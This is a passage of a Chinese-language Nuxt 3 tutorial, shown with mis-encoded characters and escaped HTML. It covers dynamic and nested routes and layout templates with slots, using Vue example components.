text-gray-600\u0026#34;\u0026gt;é€™æ˜¯ posts/[postId]/comments/[commentId] çš„é é¢\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; åŒ¹é…åˆ°çš„ Post Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-blue-600\u0026#34;\u0026gt;{{ postId }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; åŒ¹é…åˆ°çš„ Comment Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-purple-400\u0026#34;\u0026gt;{{ commentId }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { postId, commentId } = route.params \u0026lt;/script\u0026gt; ä¾†çœ‹çœ‹å¯¦éš›è·¯ç”±åŠåŒ¹é…æ•ˆæœã€‚\nç‚ºäº†æ–¹ä¾¿ç†è§£ï¼Œæ•´ç†äº†ä»¥ä¸‹è¡¨æ ¼ï¼Œä¾†è¡¨ç¤ºé é¢çµæ§‹åŠæœŸæœ›åŒ¹é…çš„æ¨¡å¼èˆ‡åƒæ•¸ï¼š\n./pages/posts/index.vueï¼š\nåŒ¹é…æ¨¡å¼ åŒ¹é…è·¯å¾‘ åŒ¹é…åƒæ•¸ (Params) /posts /posts ç„¡ ./pages/posts/top-[number].vueï¼š\nåŒ¹é…æ¨¡å¼ åŒ¹é…è·¯å¾‘ åŒ¹é…åƒæ•¸ (Params) /posts/top-:number /posts/top-3 { number: 3 } /posts/top-:number /posts/top-5 { number: 5 } ./pages/posts/[postId]/index.vueï¼š\nåŒ¹é…æ¨¡å¼ åŒ¹é…è·¯å¾‘ åŒ¹é…åƒæ•¸ (Params) /posts/:postId /posts/8 { postId:8 } ./pages/posts/[postId]/comment/[commentId].vueï¼š\nåŒ¹é…æ¨¡å¼ åŒ¹é…è·¯å¾‘ åŒ¹é…åƒæ•¸ (Params) /posts/:postId/comments/:commentId /posts/8/comments/1 { postId: 8, commentId: 1 } åˆ°é€™è£¡æ‡‰è©²å°æ–¼å¦‚ä½•ä½¿ç”¨æª”æ¡ˆåç¨±èˆ‡ç›®éŒ„çµæ§‹ï¼Œä¾†è£½ä½œå‹•æ…‹è·¯ç”±èˆ‡åŒ¹é…åƒæ•¸æœ‰ä¸€äº›æ¦‚å¿µäº†ã€‚\nå·¢ç‹€è·¯ç”± (Nested Routes) å·¢ç‹€è·¯ç”± (Nested Routes) æˆ–ç¨±åµŒå¥—è·¯ç”±ï¼Œé¡§åæ€ç¾©ï¼Œç•¶æˆ‘å€‘æƒ³è¦åœ¨ä¸€å€‹é é¢é‘²åµŒå¦ä¸€å€‹é é¢æ™‚ï¼Œå°±éœ€è¦å·¢ç‹€è·¯ç”±ä¾†å¹«åŠ©æˆ‘å€‘ã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘æƒ³è¦åœ¨ docs é é¢å…ƒä»¶ä¸­é¡¯ç¤º doc-1 æˆ– doc-2 é é¢å…ƒä»¶ï¼Œä¸¦åœ¨åˆ‡æ› doc-1 æˆ– doc-2 é é¢æ™‚ï¼Œåªæ˜¯åœ¨ docs ä¸‹çš„åµŒå¥—é é¢é€²è¡Œåˆ‡æ›ã€‚\n1 2 3 4 5 6 7 8 /docs/doc-1 /docs/doc-2 +------------------+ +-----------------+ | docs | | docs | | +--------------+ | | +-------------+ | | | doc-1 | | +------------\u0026gt; | | doc-2 | | | | | | | | | | | +--------------+ | | +-------------+ | +------------------+ +-----------------+ åœ¨ Vue 3 ä½¿ç”¨ Vue Router å¯¦ä½œä¸Šè¿°å·¢ç‹€è·¯ç”±æ™‚ï¼Œå³ docs é é¢è¦èƒ½é¡¯ç¤º doc-1ï¼Œæˆ‘å€‘åœ¨è·¯ç”±é…ç½®å¯èƒ½å°±æœƒå¯« path: '/docs' èˆ‡ childrenï¼Œä¸¦åœ¨ children åŠ å…¥ path: '/doc-1'ï¼Œå…¶ä¸­ docs é é¢åŒ…å« \u0026lt;router-view /\u0026gt;ï¼Œæœ€çµ‚ç€è¦½è·¯ç”±è·¯å¾‘ /docs/doc-1 å°±å¯ä»¥çœ‹åˆ°åµŒå¥—é é¢çš„æ•ˆæœã€‚\n1 2 3 4 5 6 7 8 9 10 { path: \u0026#34;/docs\u0026#34;, component: () =\u0026gt; import(\u0026#34;./pages/docs.vue\u0026#34;) children: [ { path: \u0026#34;doc-1\u0026#34;, component: () =\u0026gt; import(\u0026#34;./pages/docs/doc-1.vue\u0026#34;) } ] } è€Œåœ¨ Nuxt 3 é é¢çš„ç´„å®šå¼è·¯ç”±æ©Ÿåˆ¶ä¸‹ï¼Œæˆ‘å€‘å³æ˜¯é€éç›®éŒ„çµæ§‹èˆ‡é é¢å…ƒä»¶å¯¦åšå‡ºåµŒå¥—è·¯ç”±çš„æ•ˆæœã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶æˆ‘å€‘å»ºç«‹äº†ä¸‹é¢çš„ç›®éŒ„é é¢çµæ§‹ï¼š\né€™è£¡éœ€è¦æ³¨æ„ï¼Œä¸€å®šè¦æœ‰ docs.vue èˆ‡ docs åŒåçš„ç›®éŒ„\n1 2 3 4 5 ./pages/ â”œâ”€â”€ docs/ â”‚ â”œâ”€â”€ doc-1.vue â”‚ â””â”€â”€ doc-2.vue â””â”€â”€ docs.vue é é¢å…ƒä»¶çš„åƒè€ƒç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\npages/docs.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;my-6 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl font-semibold text-gray-800\u0026#34;\u0026gt;é€™è£¡æ˜¯ Docs\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/docs/doc-1\u0026#34;\u0026gt;å‰å¾€ Doc 1\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/docs/doc-2\u0026#34;\u0026gt;å‰å¾€ Doc 2\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;border-b-2 border-gray-100\u0026#34; /\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/doc-1.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-blue-500\u0026#34;\u0026gt;é€™æ˜¯æˆ‘çš„ç¬¬ä¸€ä»½æ–‡ä»¶\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/doc-2.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-green-500\u0026#34;\u0026gt;é€™æ˜¯æˆ‘çš„ç¬¬äºŒä»½æ–‡ä»¶\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Nuxt 3 åœ¨è‡ªå‹•ç”Ÿæˆè·¯ç”±æ™‚ï¼Œå¯¦éš›ä¸Šå¹«æˆ‘å€‘åšå‡ºäº†é¡ä¼¼é€™æ¨£å­çš„è·¯ç”±çµæ§‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 { name: \u0026#34;docs\u0026#34;, path: \u0026#34;/docs\u0026#34;, component: \u0026#34;./pages/docs.vue\u0026#34;, children: [ { name: \u0026#34;docs-first-doc\u0026#34;, path: \u0026#34;doc-1\u0026#34;, component: \u0026#34;./pages/docs/doc-1.vue\u0026#34;, } ] } ä¸€å®šè¦è¨˜å¾—åœ¨ docs é é¢åŠ ä¸Š \u0026lt;NuxtPage /\u0026gt;ï¼Œä¾†ä½œç‚ºé¡¯ç¤ºå·¢ç‹€é é¢çš„å®¹å™¨ï¼Œæ¥è‘—åˆ†åˆ¥ç€è¦½ /docsã€/docs/doc-1 èˆ‡ /docs/doc-2ï¼Œå¯ä»¥ç™¼ç¾åœ¨å…©å€‹é é¢ä¸­ä¸Šæ–¹çš„çš†æœ‰é¡¯ç¤ºæ¨™é¡Œã€Œé€™è£¡æ˜¯ Docsã€ï¼Œè©²æ–‡å­—æ˜¯ç”± docs.vue å…ƒä»¶æä¾›çš„æ¨™é¡Œæ–‡å­—ï¼Œè€Œé é¢ä¸‹æ–¹å‰‡æ˜¯ doc-1 èˆ‡ doc-2 å­é é¢é¡¯ç¤ºçš„åœ°æ–¹ï¼Œä»¥æ­¤å°±å¯ä»¥å¯¦ç¾å·¢ç‹€è·¯ç”±æ•ˆæœå›‰ï¼\né€éç›®éŒ„æª”æ¡ˆçš„çµæ§‹èˆ‡åç¨±åŠä¸­æ‹¬è™Ÿ [] æˆ‘å€‘å°±å¯ä»¥å®Œæˆå¤šæ•¸è·¯ç”±çš„æƒ…å¢ƒï¼Œç¢ºå¯¦æ–¹ä¾¿å¾ˆå¤šï¼Œä¹Ÿè¶³ä»¥æ‡‰ä»˜å¤§éƒ¨åˆ†å¯¦å‹™ä¸Šçš„éœ€æ±‚ï¼Œå¦‚æœçœŸçš„éœ€è¦æ‰‹å‹•å»ºç«‹è·¯ç”±è¦å‰‡å¯ä»¥åœ¨åƒè€ƒå®˜æ–¹æ–‡æª”æˆ–ç­‰å¾…é‡‹å‡ºæ›´å¥½è§£æ±ºæ–¹æ¡ˆã€‚\nå¸ƒå±€æ¨¡æ¿ (Layouts) Nuxt 3 æä¾›äº†ä¸€å€‹å¸ƒå±€æ¨¡æ¿ (Layouts) çš„åŠŸèƒ½ï¼Œå¯ä»¥è®“ä½ å®šç¾©å¥½å¸ƒå±€æ¨¡æ¿å¾Œï¼Œåœ¨æ•´å€‹ Nuxt ä¸­ä½¿ç”¨ï¼Œèˆ‰ä¾‹ä¾†èªªå°±å¾ˆé©åˆå¦‚ä¸Šæ–¹æœ‰å°è¦½åˆ—ï¼Œä¸‹æ–¹æ˜¯ç¶²é ä¸»é«”å…§å®¹çš„é€™ç¨®æ’ç‰ˆæ–¹å¼ï¼Œå°‡å…¶æ§‹å»ºæˆä¸€å€‹å¸ƒå±€æ¨¡æ¿å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥é‡è¤‡ä½¿ç”¨é€™ç¨®å¸ƒå±€æ–¹å¼ã€‚\nå¸ƒå±€æ¨¡æ¿é€šå¸¸æ”¾ç½®åœ¨ ./layouts ç›®éŒ„ä¹‹ä¸‹ï¼Œä¹Ÿå…·æœ‰ç•°æ­¥è‡ªå‹•å°å…¥çš„æ•ˆæœï¼Œç•¶æ–°å¢å¥½å¸ƒå±€æª”æ¡ˆå¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥åœ¨ app.vue ä¸­ï¼Œæ·»åŠ  \u0026lt;NuxtLayout /\u0026gt; å…ƒä»¶ä¾†è¡¨ç¤ºä½¿ç”¨å¸ƒå±€æ¨¡æ¿ï¼Œä¹Ÿå¯ä»¥é€šé name è¨­å®šä¸åŒçš„æ¨¡æ¿åç¨±ã€‚\nå»ºç«‹ä¸€å€‹é è¨­çš„å¸ƒå±€æ¨¡æ¿ å¸ƒå±€æ¨¡æ¿åœ¨ Nuxt 3 ä¸­æœ‰ç´„å®šä¸€å€‹åç¨±ç‚º default.vue ä½œç‚ºé è¨­çš„æ¨¡æ¿ï¼Œå¦‚æœåœ¨é é¢å…ƒä»¶ä¸­æœªç‰¹åˆ¥æŒ‡å®šè¦ä½¿ç”¨å“ªå€‹æ¨¡æ¿æˆ– \u0026lt;NuxtLayout /\u0026gt; æ²’æœ‰è¨­å®š name å±¬æ€§ï¼Œé‚£éº¼éƒ½å°‡æœƒä½¿ç”¨ default ä½œç‚ºé è¨­çš„å¸ƒå±€ã€‚\nStep 1. å»ºç«‹é è¨­å¸ƒå±€æ¨¡æ¿ æ–°å¢ ./layouts/default.vue æª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼š\nlayouts/default.vue 1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-sky-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt;é€™æ˜¯é è¨­çš„å¸ƒå±€ï¼Œå…¨éƒ¨é é¢éƒ½æœƒä½¿ç”¨åˆ°\u0026lt;/p\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨å¸ƒå±€æ¨¡æ¿ä¸­ï¼Œé€šå¸¸æœƒåŒ…å«ä¸€å€‹ \u0026lt;slot /\u0026gt; æ’æ§½ï¼Œé€™å€‹æœªå‘½åçš„æ’æ§½ (slot) å³ç‚ºé è¨­æ’æ§½ï¼Œé€™å°‡æœƒæ˜¯æ¡ç”¨é€™å€‹å¸ƒå±€æ¨¡æ¿çš„é é¢å…ƒä»¶ï¼Œé¡¯ç¤ºçš„å…§å®¹å®¹å™¨ä½ç½®ã€‚\nStep 2. æ·»åŠ  å…ƒä»¶ èª¿æ•´ app.vue æª”æ¡ˆï¼Œå…§å®¹å¦‚ä¸‹ï¼Œæˆ‘å€‘æ·»åŠ  \u0026lt;NuxtLayout\u0026gt; ä½œç‚ºå¸ƒå±€æ¨¡æ¿é¡¯ç¤ºçš„ä½ç½®ï¼Œname å±¬æ€§é è¨­æ˜¯ defaultï¼Œä¸éæˆ‘å€‘é‚„æ˜¯å¯«ä¸Š name=\u0026quot;default\u0026quot; é¿å…èª¤æœƒï¼Œé€™å€‹ name å±¬æ€§å€¼å°æ‡‰çš„å³æ˜¯å¸ƒå±€æ¨¡æ¿çš„åç¨±ã€‚\nä¸‹åœ–å¯ä»¥çœ‹è¦‹ï¼Œæˆ‘å€‘åœ¨ app.vue æ‰€å¯«çš„æ–‡å­—ã€Œé€™è£¡æ˜¯æœ€å¤–å±¤ app.vueã€ï¼Œæœƒæ˜¯åœ¨æœ€å¤–å±¤ï¼Œè€Œç·Šæ¥è‘—çš„ \u0026lt;NuxtLayout name=\u0026quot;default\u0026quot;\u0026gt;\u0026lt;/NuxtLayout\u0026gt;ï¼Œå°±æ˜¯å¸ƒå±€é é¢ default.vueã€‚\nå¸ƒå±€æ¨¡æ¿ä¸­çš„æ’æ§½ å¦‚æœä½ æœ‰æ³¨æ„åˆ°ï¼Œdefault.vue æª”æ¡ˆå…§ç¨‹å¼ç¢¼å…§ï¼Œæœ‰ä¸€å€‹æ’æ§½ \u0026lt;slot /\u0026gt;ï¼Œé€™è£¡å°±æœƒæ˜¯ \u0026lt;NuxtLayout\u0026gt; å…§çš„å…ƒç´ æ‰€é¡¯ç¤ºçš„ä½ç½®ã€‚\nä¾‹å¦‚ï¼Œæˆ‘å€‘åœ¨ app.vue ç¨ä½œèª¿æ•´ï¼š\napp.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-4 bg-white\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;pb-4 text-2xl text-slate-600\u0026#34;\u0026gt;é€™è£¡æ˜¯æœ€å¤–å±¤ app.vue\u0026lt;/p\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-slate-800\u0026#34;\u0026gt; è¢« NuxtLayout åŒ…è£¹çš„å…ƒä»¶å°‡æœƒæ”¾ç½®åˆ° Layout çš„ slot ä¸­ \u0026lt;/p\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; è¢« \u0026lt;NuxtLayout name=\u0026quot;default\u0026quot;\u0026gt; åŒ…è£¹çš„å…ƒç´ ï¼Œå°±æœƒåœ¨å¸ƒå±€æ¨¡æ¿ä¸­çš„æ’æ§½ \u0026lt;slot /\u0026gt; é¡¯ç¤ºã€‚\nåœ¨å¸ƒå±€æ¨¡æ¿ä¸­å»ºç«‹å¤šå€‹æ’æ§½ ç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨å¸ƒå±€æ¨¡æ¿ä¸­æ·»åŠ å¤šå€‹æ’æ§½ï¼Œä¸¦çµ¦äºˆåç¨±ï¼Œé€™æ¨£å°±å¯ä»¥å°‡å…§å®¹å®‰æ’åˆ°ç‰¹å®šçš„ä½ç½®ã€‚\nStep 1. å»ºç«‹å…©å€‹å…·åçš„æ’æ§½ (Slot)ï¼Œåˆ†åˆ¥ç‚º header èˆ‡ footer å¦‚æœæ’æ§½æ²’æœ‰çµ¦äºˆ name å±¬æ€§ï¼Œé è¨­ç‚º defaultã€‚\nlayouts/default.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-sky-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt;é€™æ˜¯é è¨­çš„å¸ƒå±€ï¼Œå…¨éƒ¨é é¢éƒ½æœƒä½¿ç”¨åˆ°\u0026lt;/p\u0026gt; \u0026lt;slot name=\u0026#34;header\u0026#34; /\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. å°‡ä¸åŒå…§å®¹ï¼Œé¡¯ç¤ºæ–¼æŒ‡å®šçš„æ’æ§½ä½ç½®ã€‚ app.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-4 bg-white\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;pb-4 text-2xl text-slate-600\u0026#34;\u0026gt;é€™è£¡æ˜¯æœ€å¤–å±¤ app.vue\u0026lt;/p\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;template #header\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-green-500\u0026#34;\u0026gt;é€™æ®µæœƒæ”¾ç½®åœ¨ header æ’æ§½\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #default\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-cyan-500\u0026#34;\u0026gt; è¢« NuxtLayout åŒ…è£¹çš„å…ƒä»¶å°‡æœƒæ”¾ç½®åˆ° Layout çš„é è¨­ slot ä¸­ \u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-blue-500\u0026#34;\u0026gt;é€™æ®µæœƒæ”¾ç½®åœ¨ footer æ’æ§½\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ä¸‹åœ–å¯ä»¥çœ‹è¦‹ï¼Œæˆ‘å€‘å°±å¯ä»¥ä¾æ­¤ä¾†å®‰æ’å„å€‹å…ƒä»¶ï¼Œæ–¼å¸ƒå±€æ¨¡æ¿æ’æ§½çš„æ‰€åœ¨ä½ç½®ã€‚\nå¸ƒå±€æ¨¡æ¿èˆ‡è·¯ç”±é é¢ ç•¶ä½ ç†Ÿæ‚‰äº†æ’æ§½é…ç½®ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨å…¶ä¸­æ·»åŠ  \u0026lt;NuxtPage /\u0026gt; èˆ‡å»ºç«‹ pages ä¸‹çš„é é¢å…ƒä»¶ï¼Œä»¥é”åˆ°ä¸åŒçš„è·¯ç”±é é¢ï¼Œä½¿ç”¨ç›¸åŒçš„å¸ƒå±€æ–¹å¼ã€‚\nå¦‚æœå¸ƒå±€æ¨¡æ¿çµåˆäº†è·¯ç”±é é¢ï¼Œæ•´é«”ç¶²ç«™å°±æœƒå¦‚ä¸‹çš„å·¢ç‹€é¡¯ç¤ºæ–¹å¼ï¼Œç¶²ç«™çš„å…¥å£é» app.vue æ”¾ç½®å¸ƒå±€æ¨¡æ¿ï¼Œæ¨¡æ¿å…§çš„å…§å®¹å‰‡ä½¿ç”¨è·¯ç”±çš„ \u0026lt;NuxtPage /\u0026gt;ï¼Œæœ€å¾Œå„å€‹è·¯ç”±çš„é é¢å°±æœƒåœ¨ \u0026lt;NuxtPage /\u0026gt; å®¹å™¨ä¸­é¡¯ç¤ºã€‚\n1 2 3 4 5 6 7 8 9 10 11 +---------------------------+ | app.vue | | +-----------------------+ | | | layout | | | | +-------------------+ | | | | | page | | | | | | | | | | | | | | | | | +-------------------+ | | | +-----------------------+ | +---------------------------+ å»ºç«‹å¸ƒå±€æ¨¡æ¿èˆ‡è·¯ç”±é é¢ Step 1. èª¿æ•´ app.vue å…¥å£é» å°‡ app.vue èª¿æ•´ç‚ºä»¥ä¸‹å…§å®¹ï¼š\napp.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-4 bg-white\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;pb-4 text-2xl text-slate-600\u0026#34;\u0026gt;é€™è£¡æ˜¯æœ€å¤–å±¤ app.vue\u0026lt;/p\u0026gt; \u0026lt;NuxtLayout\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. å»ºç«‹è·¯ç”±é é¢ å»ºç«‹ ./pages/index.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/index.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-6 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; é€™æ¨£æˆ‘å€‘å°±å¯ä»¥ä¾†è®“è·¯ç”±é é¢å…±ç”¨ç›¸åŒçš„å¸ƒå±€æ¨¡æ¿ã€‚\nå¤šå€‹è·¯ç”±é é¢å…±ç”¨é è¨­å¸ƒå±€æ¨¡æ¿ æ‰¿ä¸Šï¼Œæˆ‘å€‘å»ºç«‹å¥½é è¨­çš„å¸ƒå±€æ¨¡æ¿ï¼Œè®“å®ƒè² è²¬é¡¯ç¤ºè·¯ç”±çš„é é¢ã€‚\nStep 1. æ–°å¢è·¯ç”±é é¢ æ–°å¢ ./pages/about.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/about.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-yellow-400\u0026#34;\u0026gt;å¤§å®¶å¥½ï¼æˆ‘æ˜¯ Ryan\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;é€™è£¡æ˜¯ /about\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; æ–°å¢ ./pages/contact.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/contact.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-rose-400\u0026#34;\u0026gt;å¦‚æœæ²’äº‹ä¸è¦æ‰¾æˆ‘ xDDD\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;é€™è£¡æ˜¯ /contact\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. æ–°å¢è·¯ç”±é€£çµ èª¿æ•´ ./pages/index.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;é€™è£¡æ˜¯é¦–é \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/about\u0026#34;\u0026gt;å‰å¾€ About\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/contact\u0026#34;\u0026gt;å‰å¾€ Contact\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å¯ä»¥ç™¼ç¾ï¼Œç¾åœ¨é¦–é  /ã€/about èˆ‡ /contact éƒ½å¥—ç”¨ä¸Šäº†é è¨­å¸ƒå±€ã€‚\nå»ºç«‹å¤šå€‹å¸ƒå±€æ¨¡æ¿ ä½ ä¹Ÿå¯ä»¥å»ºç«‹å¤šå€‹å¸ƒå±€æ¨¡æ¿ï¼Œå†ä¾æ“šä¸åŒçš„æƒ…å¢ƒï¼Œä½¿ç”¨ä¸åŒçš„å¸ƒå±€æ¨¡æ¿ã€‚\nStep 1. å»ºç«‹æ–°çš„å¸ƒå±€æ¨¡æ¿ æ–°å¢ ./layouts/custom.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nlayouts/custom.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-rose-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt; ä½¿ç”¨ \u0026lt;span class=\u0026#34;font-bold text-rose-500\u0026#34;\u0026gt;Custom\u0026lt;/span\u0026gt; å¸ƒå±€ \u0026lt;/p\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. æ–°å¢ä¸€å€‹è·¯ç”±é é¢ æ–°å¢ ./pages/custom.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/custom.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-6 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;éµäººè³½\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 3. ä½¿ç”¨æŒ‡å®šå¸ƒå±€æ¨¡æ¿ åœ¨ ./pages/custom.vue ä¸­çš„ script ä½¿ç”¨ definePageMeta æ–¹æ³•ï¼š\n1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ layout: \u0026#39;custom\u0026#39; }) \u0026lt;/script\u0026gt; definePageMeta æ–¹æ³•ï¼Œæä¾›æˆ‘å€‘å¯ä»¥è¨­å®šç‰¹å®šçš„å¸ƒå±€æ¨¡æ¿ï¼Œlayout åƒæ•¸å€¼æ‰€å°æ‡‰çš„åç¨±ï¼Œå³ç‚º ./layouts ç›®éŒ„ä¸‹çš„å¸ƒå±€æ¨¡æ¿ã€‚\næ³¨æ„ï¼Œå¸ƒå±€æ¨¡æ¿çš„å‘½åè¢«è¦ç¯„ä½¿ç”¨ Kebab Case å‘½åæ³•ï¼Œè‹¥æª”æ¡ˆåç¨±ç‚º customLayout.vueï¼Œå®ƒå°‡æœƒä»¥ custom-layout ä½œç‚º name å±¬æ€§å‚³éçµ¦\næ›´é€²éšçš„æŒ‡å®šå¸ƒå±€æ¨¡æ¿ æˆ‘å€‘èƒ½ä½¿ç”¨ layout: false ä¾†ç¦æ­¢ä½¿ç”¨é è¨­çš„å¸ƒå±€æ¨¡æ¿ï¼Œä¸¦åœ¨ template æ·»åŠ  \u0026lt;NuxtLayout name=\u0026quot;custom\u0026quot;\u0026gt; ä¾†ä½¿ç”¨ custom å¸ƒå±€æ¨¡æ¿ã€‚\n1 2 3 4 5 6 7 8 9 